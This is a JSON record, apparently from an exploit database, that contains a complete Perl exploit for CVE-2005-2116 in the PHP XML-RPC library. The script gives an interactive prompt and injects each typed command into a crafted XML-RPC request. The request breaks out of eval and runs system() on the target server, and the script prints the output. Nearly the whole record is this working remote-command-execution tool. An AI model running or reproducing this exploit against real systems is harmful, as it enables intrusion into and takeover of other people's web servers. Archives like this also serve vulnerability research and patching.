{
  "id": "1078",
  "title": "XML-RPC Library 1.3.0 - &#039;xmlrpc.php&#039; Remote Code Injection",
  "cve": "CVE-2005-2116",
  "vuln_type": "unknown",
  "code": "# tested and working /str0ke\r\n\r\n#!/usr/bin/perl\r\n# \r\n#  ilo-- \r\n#\r\n#  This program is no GPL or has nothing to do with FSF, but some\r\n#  code was ripped from romansoft.. sorry, too lazy!\r\n#  \r\n#  xmlrpc bug by James from GulfTech Security Research. \r\n#  http://pear.php.net/bugs/bug.php?id=4692\r\n#  xmlrpc drupal exploit, but James sais xoops, phpnuke and other\r\n#  cms should be vulnerable.\r\n#\r\n#  greets: dsr! digitalsec.net\r\n#\r\nrequire LWP::UserAgent;\r\nuse URI;\r\nuse Getopt::Long;\r\nuse strict;\r\n$| = 1;  # fflush stdout after print\r\n\r\n# Default options\r\n# connection \r\nmy $basic_auth_user = '';\r\nmy $basic_auth_pass = '';\r\nmy $proxy = '';\r\nmy $proxy_user = '';\r\nmy $proxy_pass = '';\r\nmy $conn_timeout = 15;\r\n\r\n# general\r\nmy $host;\r\n \r\n #informational lines to feed my own ego.\r\n print \"xmlrpc exploit - http://www.reversing.org \\n\";\r\n print \"2005 ilo-- <ilo\".chr(64).\"reversing.org> \\n\";\r\n print \"special chars allowed are / and - \\n\\n\";\r\n\r\n # read command line options\r\n my $options = GetOptions (\r\n\r\n #general options\r\n 'host=s'    => \\$host, # input host to test.\r\n\r\n # connection options\r\n 'basic_auth_user=s' => \\$basic_auth_user,\r\n 'basic_auth_pass=s' => \\$basic_auth_pass,\r\n 'proxy=s'           => \\$proxy,\r\n 'proxy_user=s'      => \\$proxy_user,\r\n 'proxy_pass=s'      => \\$proxy_pass,\r\n 'timeout=i'         => \\$conn_timeout);\r\n\r\n # command line sanity check \r\n &show_usage unless ($host);\r\n\r\n # main loop \r\n while (1){\r\n \tprint \"\\nxmlrpc@# \";\r\n \tmy $cmd = <STDIN>;\r\n \txmlrpc_xploit ($cmd);\r\n }\r\n\r\n exit (1);\r\n\r\n#exploit \r\nsub xmlrpc_xploit {\r\nchomp (my $data = shift);\r\nmy $reply;\r\n\r\nmy $d1 = \"<?xml version=\\\"1.0\\\"?><methodCall><methodName>examples.getStateName</methodName><params><param><name>a');\";  \r\nmy $d2 = \";//</name><value>xml exploit R/01</value></param></params></methodCall>\";\r\n\r\n  $data =~ s/-/'.chr(45).'/mg;\r\n  $data =~ s/\\//'.char(47).'/mg;\r\n\r\n  my $req = new HTTP::Request 'POST' => $host;\r\n  $req->content_type('application/xml');\r\n  $req->content($d1.'system(\\''.$data.'\\')'.$d2);\r\n  \r\n  my $ua = new LWP::UserAgent;\r\n  $ua->agent(\"xmlrpc exploit R/0.1\");\r\n  $ua->timeout($conn_timeout);\r\n\r\n  if ($basic_auth_user){\r\n    $req->authorization_basic($basic_auth_user, $basic_auth_pass) \r\n  }\r\n  if ($proxy){\r\n    $ua->proxy(['http'] => $proxy);\r\n    $req->proxy_authorization_basic($proxy_user, $proxy_pass);\r\n  }\r\n \r\n  #send request, return null if not OK\r\n  my $res = $ua->request($req);\r\n  if ($res->is_success){\r\n     $reply= $res->content;\r\n  } else { \r\n     $reply = \"\";\r\n  }\r\n  $reply =~ /(.*).(<pre>warning.*)/mgsi;\r\n  print ($1);\r\n}\r\n\r\n# show options \r\nsub show_usage {\r\n  print \"Syntax: ./xmlrpc.pl [options] host/uri\\n\\n\";\r\n  print \"main options\\n\";\r\n  print \"connection options\\n\";\r\n  print \"\\t--proxy (http), --proxy_user, --proxy_pass\\n\";\r\n  print \"\\t--basic_auth_user, --basic_auth_pass\\n\";\r\n  print \"\\t--timeout \\n\";\r\n  print \"\\nExample\\n\";\r\n  print \"bash# xmlrpc.pl --host=http://www.host.com/xmlrpc.php \\n\";\r\n  print \"\\n\";\r\n  exit(1);\r\n}\r\n\r\n\r\n# milw0rm.com [2005-07-01]",
  "url": "https://www.exploit-db.com/exploits/1078"
}